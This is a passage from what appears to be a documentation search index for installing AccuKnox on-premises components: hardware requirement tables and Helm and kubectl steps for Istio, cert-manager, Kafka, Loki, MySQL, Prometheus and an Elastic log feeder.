feeder agent starts running, exec into the filebeat sidecar as below. <pre><code>Kubectl exec -it &lt;podname&gt; -c filebeat-sidecar -n &lt;namespace&gt;\nfilebeat -e -d \"*\"\n</code></pre></li> </ul>"},{"location":"accuknox-onprem/elastic/#3-metrics","title":"3. Metrics:","text":"<ul> <li>Once the feeder agent starts running, check the logs using below command <pre><code>Kubectl logs \u2013f &lt;podname&gt; \u2013n &lt;namespace&gt;\n</code></pre></li> </ul>"},{"location":"accuknox-onprem/hw-req-agent/","title":"Hw req agent","text":""},{"location":"accuknox-onprem/hw-req-agent/#accuknox-agents-resource-requirement","title":"AccuKnox Agents Resource Requirement","text":"Component Name Agents Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 4 Memory Per Node 4 Disk Size Per Node 50 Total CPU 12 Total Memory 12 Total Disk Size 150"},{"location":"accuknox-onprem/hw-req-core-components/","title":"Hw req core components","text":""},{"location":"accuknox-onprem/hw-req-core-components/#core-components-resource-requirement","title":"Core Components Resource Requirement","text":"Component Name Core Components No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 12 Memory Per Node 24 Disk Size Per Node 50 Total CPU 36 Total Memory 72 Total Disk Size 150 Taints &amp; Lables - Node Pool Name microservices"},{"location":"accuknox-onprem/hw-req-logging/","title":"Hw req logging","text":""},{"location":"accuknox-onprem/hw-req-logging/#logging-resource-requirement","title":"Logging Resource Requirement","text":"Component Name Logging No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 16 Disk Size Per Node 50 Total CPU 18 Total Memory 48 Total Disk Size 150 Taints &amp; Lables logging:true Node Pool Name logging"},{"location":"accuknox-onprem/hw-req-pre-requisites/","title":"Hw req pre requisites","text":""},{"location":"accuknox-onprem/hw-req-pre-requisites/#istio-resource-requirements","title":"Istio Resource Requirements","text":"Component Name Istio No of Nodes 2 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 2 Memory Per Node 4 Disk Size Per Node 50 Total CPU 6 Total Memory 12 Total Disk Size 150"},{"location":"accuknox-onprem/hw-req-pre-requisites/#mysql-resource-requirement","title":"MySQL Resource Requirement","text":"Component Name MySQL No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 16 Memory Per Node 20 Disk Size Per Node 50 Total CPU 48 Total Memory 60 Total Disk Size 150 Taints &amp; Lables mysql:true Node Pool Name db-mysql"},{"location":"accuknox-onprem/hw-req-pre-requisites/#kafka-resource-requirement","title":"Kafka Resource Requirement","text":"Component Name Kafka No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 16 Disk Size Per Node 50 Total CPU 18 Total Memory 48 Total Disk Size 150 Taints &amp; Lables kafka:true Node Pool Name db-kafka"},{"location":"accuknox-onprem/hw-req-pre-requisites/#pinot-resource-requirement","title":"Pinot Resource Requirement","text":"Component Name Pinot No of Nodes 6 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 20 Disk Size Per Node 50 Total CPU 36 Total Memory 120 Total Disk Size 300 Taints &amp; Lables pinot:true Node Pool Name db-pinot"},{"location":"accuknox-onprem/hw-req-prom-graf/","title":"Hw req prom graf","text":""},{"location":"accuknox-onprem/hw-req-prom-graf/#monitoring-resource-requirement","title":"Monitoring Resource Requirement","text":"Component Name Monitoring No of Nodes 3 Machine Type E2 / ec2 / vm (vmware / Cloud based VM) Image Type Any Linux based OS with Container support ( EG: GCP COS-Containerd) CPU Per Node 6 Memory Per Node 10 Disk Size Per Node 50 Total CPU 18 Total Memory 30 Total Disk Size 150 Taints &amp; Lables monitoring:true Node Pool Name monitoring"},{"location":"accuknox-onprem/istio-install/","title":"Istio install","text":""},{"location":"accuknox-onprem/istio-install/#istio-installion-steps","title":"Istio Installion steps:","text":"<ol> <li>Go to the Istio release page to download the installation file for your OS, or download  and extract the latest release automatically (Linux or macOS):  <pre><code>curl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.10.0 TARGET_ARCH=x86_64 sh - </code></pre></li> <li>Move to the Istio package directory. For example, if the package is istio-1.11.3:     <pre><code>cd istio-1.10.0 </code></pre></li> <li>Create a namespace istio-system for Istio components:  <pre><code>kubectl create namespace istio-system </code></pre></li> <li>Install the Istio base chart which contains cluster-wide resources used by the Istio  control plane:  <pre><code>helm install istio-base manifests/charts/base -n istio-system\n</code></pre></li> <li>Install the Istio discovery chart which deploys the istiod control plane service:  <pre><code>helm install istiod manifests/charts/istio-control/istio-discovery -n istio-system  </code></pre></li> <li>Install the Istio ingress gateway chart which contains the ingress gateway components:  <pre><code>helm install istio-ingress manifests/charts/gateways/istio-ingress -n istio-system\n</code></pre></li> </ol>"},{"location":"accuknox-onprem/istio-install/#verifying-the-installation","title":"Verifying the installation:","text":"<p>Ensure all Kubernetes pods in istio-system namespace are deployed and have a STATUS of Running:  </p> <pre><code>kubectl get pods -n istio-system\n</code></pre>"},{"location":"accuknox-onprem/istio-install/#installing-gateway","title":"Installing Gateway","text":"<p>Along with creating a service mesh, Istio allows you to manage gateways, which are Envoy  proxies running at the edge of the mesh, providing fine-grained control over traffic entering and  leaving the mesh. </p>"},{"location":"accuknox-onprem/istio-install/#add-accuknox-repositories-to-install-istio-helm-package","title":"Add accuknox repositories to install istio helm package:","text":"<p><pre><code>helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites\nhelm repo update\nhelm search repo accuknox-onprem-prerequisites\nhelm pull accuknox-onprem-prerequisites/istio-gateway-charts --untar\n</code></pre> Move to directory <pre><code>cd  istio-gateway-charts\n</code></pre></p>"},{"location":"accuknox-onprem/istio-install/#cert-manager","title":"Cert Manager","text":"<p>Install cert-manager. Cert-manager will manage the certificates of gateway domains.  </p>"},{"location":"accuknox-onprem/istio-install/#setup-permissions","title":"Setup permissions","text":"<p>When running on GKE (Google Kubernetes Engine), you might encounter a \u2018permission denied\u2019  error when creating some of the required resources. </p> <pre><code>kubectl create clusterrolebinding cluster-admin-binding --clusterrole=cluster-admin --user=$(gcloud config get-value core/account)  </code></pre>"},{"location":"accuknox-onprem/istio-install/#install-cert-manager","title":"Install Cert-manager","text":"<pre><code>kubectl apply -f https://github.com/jetstack/cert-manager/releases/download/v1.3.1/cert-manager.yaml\n</code></pre>"},{"location":"accuknox-onprem/istio-install/#platform-istio-gateway","title":"Platform-istio-gateway","text":"<p>Istio Gateway configurations for DNS This gateway config file defines the base API endpoints of the micro services under DNS This repository also contains necessary files to setup SSL for DNS (Refer issuer.yaml and cert.yaml) using  cert-manager  </p>"},{"location":"accuknox-onprem/istio-install/#create-gateway","title":"Create Gateway","text":"<p>Find the Gateway IP</p> <pre><code>INGRESS_HOST=$(kubectl -n istio-system get service istio-ingressgateway -o  jsonpath='{.status.loadBalancer.ingress[0].ip}')  \nThis will give you a LoadBalancer IP  echo ${INGRESS_HOST} </code></pre>"},{"location":"accuknox-onprem/istio-install/#create-dns","title":"Create DNS","text":"<p>Create A record for example (sample.example.com and keycloak.example.com) using LoadBalancer IP  # Create a certificate Issuers, and ClusterIssuers, are Kubernetes resources that represent certificate authorities (CAs)  that are able to generate signed certificates by honoring certificate signing requests. </p> <p><pre><code>kubectl apply -f issuer.yaml \nkubectl get ClusterIssuer -n cert-manager # Should have Status as Ready \n</code></pre> A Certificate is a namespaced resource that references an Issuer or ClusterIssuer that  determine what will be honoring the certificate request. </p> <p><pre><code>kubectl apply -f cert.yaml \nkubectl get Certificate -n istio-system # Should have Status as Ready # Create gateway with SSL  \nkubectl apply -f gateway-with-ssl.yaml` [No need to specify namespace] # Apply Virtual Service  \n</code></pre> A VirtualService defines a set of traffic routing rules to apply when a host is addressed. Each  routing rule defines matching criteria for traffic of a specific protocol. If the traffic is matched,  then it is sent to a named destination service (or subset/version of it) defined in the registry.  </p> <p><pre><code>kubectl apply -f backend-api/virtual-service.yaml\n</code></pre> [No need to specify namespace] </p> <pre><code>kubectl apply -f keycloak/virtual-service.yaml\n</code></pre>"},{"location":"accuknox-onprem/istio-purpose/","title":"Istio purpose","text":"<p>Istio is an open source service mesh that layers transparently onto existing distributed applications. Istio\u2019s powerful features provide a uniform and more efficient way to secure, connect, and monitor services. Istio is the path to load balancing, service-to-service authentication, and monitoring \u2013 with few or no service code changes. </p> <p>Its powerful control plane brings vital features, including:</p> <ul> <li> <p>Secure service-to-service communication in a cluster with TLS encryption, strong identity based authentication and authorization</p> </li> <li> <p>Automatic load balancing for HTTP, gRPC, WebSocket, and TCP traffic </p> </li> <li> <p>Fine-grained control of traffic behavior with rich routing rules, retries, failovers, and fault injection</p> </li> <li> <p>A pluggable policy layer and configuration API supporting access controls, rate limits and quotas</p> </li> <li> <p>Automatic metrics, logs, and traces for all traffic within a cluster, including cluster ingress and egress</p> </li> </ul> <p>For more reference: click here..</p>"},{"location":"accuknox-onprem/istio-verify/","title":"Istio verify","text":""},{"location":"accuknox-onprem/istio-verify/#to-verify","title":"To verify","text":"<pre><code>kubectl get po -n istio-system\n</code></pre>"},{"location":"accuknox-onprem/kafka-install/","title":"Kafka install","text":""},{"location":"accuknox-onprem/kafka-install/#note","title":"Note:","text":"<p>Kafka Operator Deployment 1. Don't change the namespace name because if you change the namespace - You need to change the service name , If the service name is changed ,then you need to change the microservice configmap files . eg: app.yaml.</p> <ol> <li>Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and labels</li> </ol> <p>Taints - kafka:true  <p>Labels - kafka:true</p>"},{"location":"accuknox-onprem/kafka-install/#installing-helm","title":"Installing Helm","text":"<p>This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases.</p>"},{"location":"accuknox-onprem/kafka-install/#from-the-binary-releases","title":"From the Binary Releases","text":"<p>Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed.</p> <p>Download your desired version</p> <p>Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz)</p> <p>Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm)</p> <p>Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question.</p> <p>For more reference: Click here..</p> <p>Add accuknox repository to install strimzi-kafka-operator helm package:</p> <p><pre><code>helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites\nhelm repo update\nhelm search repo accuknox-onprem-prerequisites\nhelm pull accuknox-onprem-prerequisites/strimzi-kafka-operator --untar\n</code></pre> <pre><code>kubectl create namespace accuknox-kafka\n</code></pre> <pre><code>helm install accuknox-kafka  strimzi-kafka-operator -n accuknox-kafka\n</code></pre></p> <p>Check the Pods deployment <pre><code>kubectl get pods -n accuknox-kafka\n</code></pre></p> <p>Extract the connectivity information.</p>"},{"location":"accuknox-onprem/kafka-install/#get-bootstrap-server-endpoint","title":"Get bootstrap server endpoint","text":"<pre><code>kubectl get kafka accuknox-kafka -o jsonpath='{.status.listeners[?(@.type==\"external\")].bootstrapServers}' -n accuknox-kafka\n</code></pre>"},{"location":"accuknox-onprem/kafka-install/#get-ca","title":"Get CA","text":"<pre><code>kubectl get secret accuknox-kafka-cluster-ca-cert -o jsonpath='{.data.ca\\.p12}' -n accuknox-kafka | base64 -d &gt; ca.p12\n</code></pre> <p>Note:</p> <p>For any application connecting to Kafka outside the GKE, It needs to communicate via SSL/TLS authentication.</p> <p>We need to provide the connectivity details to the component owners who are configuring the application deployed outside GKE Cluster..</p>"},{"location":"accuknox-onprem/kafka-install/#get-ca-password","title":"Get CA Password","text":"<pre><code>kubectl get secret accuknox-kafka-cluster-ca-cert -o jsonpath='{.data.ca\\.password}' -n accuknox-kafka | base64 -d &gt; ca.password\n</code></pre>"},{"location":"accuknox-onprem/kafka-install/#get-user-cert","title":"Get User Cert","text":"<pre><code>kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath='{.data.user\\.p12}' | base64 -d &gt; user.p12\n</code></pre>"},{"location":"accuknox-onprem/kafka-install/#get-user-password","title":"Get user password","text":"<pre><code>kubectl get secret/node-event-feeder-common -n accuknox-kafka -o jsonpath='{.data.user\\.password}' | base64 -d &gt; user.password\n</code></pre>"},{"location":"accuknox-onprem/kafka-install/#convert-userp12-into-base64","title":"Convert user.p12 into base64","text":"<pre><code>cat user.p12 | base64 &gt; user.p12.base64\n</code></pre>"},{"location":"accuknox-onprem/kafka-install/#convert-cap12-into-base64","title":"Convert ca.p12 into base64","text":"<pre><code>cat ca.p12 | base64 &gt; ca.p12.base64\n</code></pre>"},{"location":"accuknox-onprem/kafka-install/#convert-capassword-into-base64","title":"Convert ca.password into base64","text":"<pre><code>cat ca.password | base64 &gt; ca.password.base64\n</code></pre>"},{"location":"accuknox-onprem/kafka-install/#convert-userpassword-into-base64","title":"Convert user.password into base64","text":"<pre><code>cat user.password | base64 &gt; user.password.base64\n</code></pre>"},{"location":"accuknox-onprem/kafka-install/#convert-p12-to-pem","title":"Convert p12 to pem","text":"<pre><code>openssl pkcs12 -in ca.p12 -out ca.pem\n</code></pre> <p>Note: copy the password from ca.password (file)</p>"},{"location":"accuknox-onprem/kafka-install/#convert-capem-to-base64","title":"Convert ca.pem to base64","text":"<p><pre><code>cat ca.pem | base64 &gt; ca.pem.base64\n</code></pre> Note: ca.p12, ca.password, user.p12 and user.password are required to be used in Java based applications. For Go based applications, use ca.pem, user.p12 and user.password. For use in Kubernetes, use the base64 versions of respective files.</p> <p>FQDN (K8\u2019s Service name) Value for Internal Cluster application connectivity.</p> <p>FQDN : accuknox-kafka-bootstrap.accuknox-kafka.svc.cluster.local:9092</p>"},{"location":"accuknox-onprem/kafka-install/#get-certificates-and-store-it","title":"Get Certificates and store it","text":"<p>NOTE: </p> <ol> <li> <p>If kafka cluster is upgraded or reinstalled, then cluster will generate new certificates and you need to change/update key-pair in the kafka clients or applications. </p> </li> <li> <p>To mitigate this issue store these below certificates in safe place at the time of installing kafka(first time installation).</p> </li> <li> <p>Manually apply these certificates using \"kubectl\" command or place under templetes folder. And also turn off the auto certificate generation by configuring(uncomment) \"clusterca\" and \"clientsca\" to \"false\" in \"kafka-cluster.yaml\" file(below image is for your reference). Once done the changes, install/upgarde the cluster.</p> </li> </ol> <p></p> <pre><code>kubectl get secret/accuknox-clients-ca -o yaml -n accuknox-kafka &gt; accuknox-clients-ca.yaml\nkubectl get secret/accuknox-clients-ca-cert -o yaml -n accuknox-kafka &gt; accuknox-clients-ca-cert.yaml\nkubectl get secret/accuknox-cluster-ca-cert -o yaml -n accuknox-kafka &gt; accuknox-cluster-ca-cert.yaml\nkubectl get secret/accuknox-cluster-ca -o yaml -n accuknox-kafka &gt; accuknox-cluster-ca.yaml\nkubectl get secret/node-event-feeder -o yaml -n accuknox-kafka &gt; node-event-feeder.yaml\nkubectl get secret/node-event-feeder-common -o yaml -n accuknox-kafka &gt; node-event-feeder-common.yaml\n</code></pre>"},{"location":"accuknox-onprem/kafka-purpose/","title":"Kafka purpose","text":"<p>Strimzi simplifies the process of running Apache Kafka in a Kubernetes cluster.</p>"},{"location":"accuknox-onprem/kafka-purpose/#features","title":"Features","text":"<ul> <li> <p>The underlying data stream-processing capabilities and component architecture of Kafka can deliver:</p> </li> <li> <p>Microservices and other applications to share data with extremely high throughput and low latency</p> </li> <li> <p>Message ordering guarantees</p> </li> <li> <p>Message rewind/replay from data storage to reconstruct an application state</p> </li> <li> <p>Message compaction to remove old records when using a key-value log</p> </li> <li> <p>Horizontal scalability in a cluster configuration</p> </li> <li> <p>Replication of data to control fault tolerance</p> </li> <li> <p>Retention of high volumes of data for immediate access</p> </li> </ul> <p>For more reference: click here..</p>"},{"location":"accuknox-onprem/kafka-verify/","title":"Kafka verify","text":"<p>Check Kafka Cluster status: <pre><code>kubectl get kafka -n accuknox-kafka\n</code></pre> </p> <p>Check kafka workloads status:</p> <p><pre><code>kubectl get all -n accuknox-kafka\n</code></pre> </p>"},{"location":"accuknox-onprem/loki-install/","title":"Loki install","text":""},{"location":"accuknox-onprem/loki-install/#installing-helm","title":"Installing Helm","text":"<p>This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases.</p>"},{"location":"accuknox-onprem/loki-install/#from-the-binary-releases","title":"From the Binary Releases","text":"<p>Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed.</p> <p>Download your desired version</p> <p>Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz)</p> <p>Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm)</p> <p>Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question.</p> <p>For more reference: Click here..</p> <p>Add accuknox repository to install  Loki helm package:</p> <pre><code>helm repo add accuknox-onprem-logging https://USERNAME:PASSWORD@agents.accuknox.com/repository/accuknox-onprem-logging \nhelm repo update\nhelm search repo accuknox-onprem-logging\nhelm pull accuknox-onprem-logging/loki-stack  --untar \nkubectl create namespace accuknox-loki-logging \nkubectl config set-context --current --namespace=accuknox-loki-logging \nhelm install loki loki-stack/\n</code></pre>"},{"location":"accuknox-onprem/loki-purpose/","title":"Loki purpose","text":"<p>Loki is a log aggregation tool, and it is the core of a fully-featured logging stack. Loki is a datastore optimized for efficiently holding log data.</p> <p>A Loki-based logging stack consists of 3 components:</p> <ul> <li> <p>Fluent bit is daemonset its running in each node to get the logs.</p> </li> <li> <p>Promtail is the agent, responsible for gathering logs and sending them to Loki.</p> </li> <li> <p>Loki is the main server, responsible for storing logs and processing queries.</p> </li> </ul>"},{"location":"accuknox-onprem/loki-verify/","title":"Loki verify","text":"<ul> <li>Check the Pods deployment</li> </ul> <pre><code>kubectl get pods -n accuknox-loki-logging\n</code></pre> <ul> <li>Add endpoint in grafana datasourceCheck the Pods deployment</li> </ul> <pre><code>kubectl get pods -n accuknox-loki-logging\n</code></pre> <ul> <li>Add endpoint in grafana datasource</li> </ul>"},{"location":"accuknox-onprem/mysql-install/","title":"Mysql install","text":""},{"location":"accuknox-onprem/mysql-install/#note","title":"Note:","text":"<ol> <li> <p>Don't change the namespace name because if you change the namespace - You need to change the service name , If the service name is changed ,then you need to change the microservice configmap files . eg: app.yaml.</p> </li> <li> <p>Please create a node pool on EKS / GKE / AKS (or) on-premises worker nodes with below Taints and labels</p> </li> </ol> <p>Taints - mysql:true  <p>Labels - mysql:true</p>"},{"location":"accuknox-onprem/mysql-install/#installing-helm","title":"Installing Helm","text":"<p>This guide shows how to install the Helm CLI. Helm can be installed either from source, or from pre-built binary releases.</p>"},{"location":"accuknox-onprem/mysql-install/#from-the-binary-releases","title":"From the Binary Releases","text":"<p>Every release of Helm provides binary releases for a variety of OSes. These binary versions can be manually downloaded and installed.</p> <p>Download your desired version</p> <p>Unpack it (tar -zxvf helm-v3.0.0-linux-amd64.tar.gz)</p> <p>Find the helm binary in the unpacked directory, and move it to its desired destination (mv linux-amd64/helm /usr/local/bin/helm)</p> <p>Note: Helm automated tests are performed for Linux AMD64 only during CircleCi builds and releases. Testing of other OSes are the responsibility of the community requesting Helm for the OS in question.</p> <p>For more reference: Click here..</p> <p>Add accuknox repository to install  Mysql Percona helm package: <pre><code>helm repo add accuknox-onprem-prerequisites https://USERNAME:PASSWORD@onprem.accuknox.com/repository/accuknox-onprem-prerequisites\nhelm repo update\nhelm search repo accuknox-onprem-prerequisites\nhelm pull accuknox-onprem-prerequisites/mysql-chart --untar\n</code></pre> <pre><code>kubectl create namespace accuknox-mysql\ncd mysql-chart \nkubectl apply -f bundle.yaml -n accuknox-mysql\nkubectl apply -f cr.yaml -n accuknox-mysql\nkubectl apply -f secrets.yaml -n accuknox-mysql\nkubectl apply -f ssl-secrets.yaml -n accuknox-mysql\n</code></pre> </p> <pre><code>kubectl apply -f backup-s3.yaml -n accuknox-mysql\n</code></pre>"},{"location":"accuknox-onprem/mysql-install/#loading-schema","title":"Loading schema","text":"<p><pre><code>helm pull accuknox-onprem-prerequisites/mysql-schema-chart --untar\nhelm upgrade --install accuknox-mysql-schema  mysql-schema-chart -n accuknox-mysql\n</code></pre> <pre><code>kubectl get pods -n accuknox-mysql\n</code></pre></p>"},{"location":"accuknox-onprem/mysql-install/#note_1","title":"Note","text":"<ol> <li> <p>To configure backup with gcs, add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and change the cron job entries as per the requirement in the cr.yaml.</p> </li> <li> <p>HMAC Keys will vary for cloud providers . (GCP, AZURE,  AWS)</p> </li> </ol> <p>After following steps the above steps, you will see a similar image as above  Run a sanitary test with below commands at the mysql namespace</p> <pre><code>kubectl run -i --rm --tty percona-client --image=percona:8.0 --restart=Never -n accuknox-mysql -- bash -il \nmysql -h accuknox-mysql-haproxy -uroot -proot_password\n</code></pre> <p>Update the passwords in secret.yaml file and run below command</p> <p><pre><code>kubectl apply -f secrets.yaml\n</code></pre> Optional To configure backup with gcs add the HMAC keys in backup-s3.yaml, change the bucket name in cr.yaml and cron can be changed as required cr.yaml files.</p> <p>FQDN: For K8\u2019s Service name</p>"},{"location":"accuknox-onprem/mysql-install/#accuknox-mysql-haproxyaccuknox-mysqlsvcclusterlocal","title":"accuknox-mysql-haproxy.accuknox-mysql.svc.cluster.local","text":""},{"location":"accuknox-onprem/mysql-purpose/","title":"Mysql purpose","text":"<p>Percona Distribution for Mysql Operator is an open-source drop in replacement for MySQL Enterprise with synchronous replication running on Kubernetes. It automates the deployment and management of the members in your Percona XtraDB Cluster environment. It can be used to instantiate a new Percona XtraDB Cluster, or to scale an existing environment. Consult the documentation on the Percona Distribution for Mysql Operator for complete details on capabilities and options.</p>"},{"location":"accuknox-onprem/mysql-purpose/#supported-features","title":"Supported Features","text":"<ul> <li> <p>Scale Your Cluster change the size parameter to add or remove members of the cluster. Three is the minimum recommended size for a functioning cluster.</p> </li> <li> <p>Automate Your Backups configure cluster backups to run on a scheduled basis. Backups can be stored on a persistent volume or S3-compatible storage. Leverage Point-in-time recovery to reduce RPO/RTO.</p> </li> <li> <p>Proxy integration choose HAProxy or ProxySQL as a proxy in front of the Percona XtraDB Cluster. Proxies are deployed and configured automatically with the Operator.</p> </li> </ul>"},{"location":"accuknox-onprem/mysql-purpose/#common-configurations","title":"Common Configurations","text":"<ul> <li> <p>Set Resource Limits - set limitation on requests to CPU and memory resources.</p> </li> <li> <p>Customize Storage - set the desired Storage Class and Access Mode for your database cluster data.</p> </li> <li> <p>Control Scheduling - define how your PXC Pods are scheduled onto the K8S cluster with tolerations, pod disruption budgets, node selector and affinity settings.</p> </li> <li> <p>Automatic synchronization of MySQL users with ProxySQL</p> </li> <li> <p>Fully automated minor version updates (Smart Update)</p> </li> <li> <p>Update Reader members before Writer member at cluster upgrades</p> </li> </ul> <p>For more reference: click here..</p>"},{"location":"accuknox-onprem/mysql-verify/","title":"Mysql verify","text":"<pre><code>kubectl run -i --rm --tty percona-client --image=percona:8.0 --restart=Never -- bash -il\n</code></pre> <pre><code>mysql -h service name\u00a0 -u[user] -p[password]\n</code></pre> <pre><code>show databases;\n</code></pre>"},{"location":"accuknox-onprem/onprem-feeder/","title":"Forwarding metrics to On-prem Feeder","text":""},{"location":"accuknox-onprem/onprem-feeder/#overview","title":"Overview","text":"<p>On Prem Feeder</p> <ul> <li>The On-Prem Feeder provides the feasibility of pushing the agent logs to Elastic Host using beats and feeder agent.</li> <li>The feeder agent also has the capability of pushing metrics into On Prem Prometheus.</li> <li>Prometheus collects and stores its metrics as time series data i.e., metrics information is stored with the timestamp at which it was recorded, alongside optional <code>key-value</code> pairs called labels.</li> <li>Elasticsearch is a search and analytics engine. It is an open source, full-text search and analysis engine, based on the Apache Lucene search engine.</li> <li>Logstash is a log aggregator that collects data from various input sources, executes different transformations and enhancements and then ships the data to various supported output destinations.</li> <li>Kibana is a visualization layer that works on top of Elasticsearch, providing users with the ability to analyze and visualize the data. And last but not least \u2014 Beats are lightweight agents that are installed on edge hosts to collect different types of data for forwarding into the stack.</li> </ul>"},{"location":"accuknox-onprem/onprem-feeder/#step-1-installation-of-feeder-service-on-prem-without-elk","title":"Step 1: Installation of Feeder Service (On Prem Without ELK)","text":"<ul> <li>As we are passing the elastic and kibana resource in the values.yaml of the feeder service , we can toggle the elastic/kibana installation along with feeder-service as below.</li> </ul> <pre><code>helm repo add accuknox-onprem-agents https://USERNAME:password@onprem.accuknox.com/repository/accuknox-onprem-agents\nhelm repo update\nhelm search repo accuknox-onprem-agents\n</code></pre> <pre><code>kubectl create ns accuknox-feeder-service\nhelm upgrade --install --set elastic.enabled=false --set kibana.enabled=false accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service\n</code></pre>"},{"location":"accuknox-onprem/onprem-feeder/#step-2-installation-of-feeder-service-on-prem-with-elk","title":"Step 2: Installation of Feeder Service (On Prem With ELK)","text":"<ul> <li>Enable the elastic resource as <code>true</code> to install Elastic along with feeder.</li> </ul> <pre><code>helm upgrade --install --set elasticsearch.enabled=true --set kibana.enabled=true accuknox-feeder-service accuknox-onprem-agents/feeder-service -n accuknox-feeder-service\n</code></pre> <pre><code>(OR)\n</code></pre> <ul> <li>Refer the page for Installation of Elastic.</li> </ul> <p>Note: If there is ELK set up already running on the cluster, the CRD apply may fail.</p> <ul> <li>The Elastic master and data pods should be in up and running state on the same namespace."},{"location":"accuknox-onprem/onprem-feeder/#step-3-view-metrics","title":"Step 3: View Metrics","text":"<p> Feeder as a SERVER </p> <ul> <li>Toggle the below variable for to push metrics directly to an endpoint.</li> </ul> <pre><code>GRPC_SERVER_ENABLED\nvalue: true\n</code></pre> <ul> <li> <p>Once the feeder agent starts running, the metrics should start flowing up.</p> </li> <li> <p>Please use <code>localhost:8000/metrics</code> endpoint to check metrics flow.</p> </li> </ul> <p> Feeder as a CLIENT</p> <ul> <li>Please toggle the below variable for to push metrics to GRPC Server in SAAS Platform / Client Platform.</li> </ul> <pre><code>GRPC_CLIENT_ENABLED\nvalue: true\nGRPC_SERVER_URL\nvalue: \"&lt;grpc_server_host&gt;\"\nGRPC_SERVER_PORT\nvalue: \"&lt;grpc_server_port&gt;\"\n</code></pre> <ul> <li>Once the feeder agent starts running, the metrics will be pushed to prometheus.</li> </ul> <p>Note: All of the above can be updated runtime as in Step 4.3</p>"},{"location":"accuknox-onprem/onprem-feeder/#31-installation-of-prometheus","title":"3.1 Installation of Prometheus","text":"<ul> <li>Refer the page for Installation of Prometheus.</li> </ul>"},{"location":"accuknox-onprem/onprem-feeder/#32-prometheus-configuration","title":"3.2 Prometheus Configuration","text":"<ul> <li>Add the below configuration in prometheus (on Prem) to see the agent metrics in Prometheus <pre><code>  job_name: &lt;feeder&gt;-chart\nhonor_timestamps: true\nscrape_interval: 30s\nscrape_timeout: 10s\nmetrics_path: /metrics\nscheme: http\nfollow_redirects: true\nstatic_configs:\n- targets:\n- &lt;localhost&gt;:8000\n</code></pre> Note: Alternatively, the target can be any GRPC Server host / port. (In case of Feeder Client)</li> </ul>"},{"location":"accuknox-onprem/onprem-feeder/#33-metrics-labelling-prometheus","title":"3.3. Metrics Labelling (Prometheus)","text":"<ul> <li>The Cilium metrics can be seen under the below label <pre><code>cilium_&lt;metricname&gt; (Eg, cilium_http_requests_total)\n</code></pre></li> <li>The Kubearmor metrics can be seen under the below label <pre><code>kubearmor_&lt;metricname&gt; (Eg, kubearmor_action_requests_total)\n</code></pre></li> <li>The Vae metrics can be seen under the below label <pre><code>vae_&lt;metricname&gt; (Eg, vae_Proc_Count_API_requests_total)\n</code></pre></li> </ul>"},{"location":"accuknox-onprem/onprem-feeder/#step-4-forwarding-logs-to-elastic","title":"Step 4: Forwarding Logs to Elastic","text":""},{"location":"accuknox-onprem/onprem-feeder/#41-beats-setup","title":"4.1. Beats Setup","text":"<ul> <li>The Beats agent will be spinned along with Filebeat running along as a sidecar.</li> <li> <p>The filebeat configuration file in the package can be updated to specific Elastic instances, and logs can be viewed in Kibana.</p> </li> <li> <p>The logs are forwarded to Elastic when the below env variable is enabled. <pre><code>- name: ELASTIC_FEEDER_ENABLED\nvalue: true\n</code></pre></p> </li> </ul>"},{"location":"accuknox-onprem/onprem-feeder/#42-elastic-configuration-parameters","title":"4.2. Elastic Configuration Parameters:","text":"<ul> <li>We will create a ConfigMap named filebeat-configmap with the content of filebeat.yml file. <pre><code>kind: ConfigMap\nmetadata:\nname: filebeat-configmap\ndata:\nfilebeat.yml: |\nfilebeat.inputs:\n- type: log\n\n# Change to true to enable this input configuration.\nenabled: true\n\n# Paths that should be crawled and fetched. Glob based paths.\npaths:\n- /var/log/*.log\noutput.elasticsearch:\nhosts: ${ELASTICSEARCH_HOST}\nusername: ${ELASTICSEARCH_USERNAME}\npassword: ${ELASTICSEARCH_PASSWORD}\nssl.verification_mode: none\n</code></pre></li> <li> <p>The below Configuration parameters can be updated for elastic configuration.</p> <p>(If Default params needs to be modified) <pre><code> - name: ELASTICSEARCH_HOST\nvalue: https://&lt;svc-name&gt;\n- name: ELASTICSEARCH_PORT\nvalue: \"&lt;svc-port&gt;\"\n- name: ELASTICSEARCH_USERNAME\nvalue: 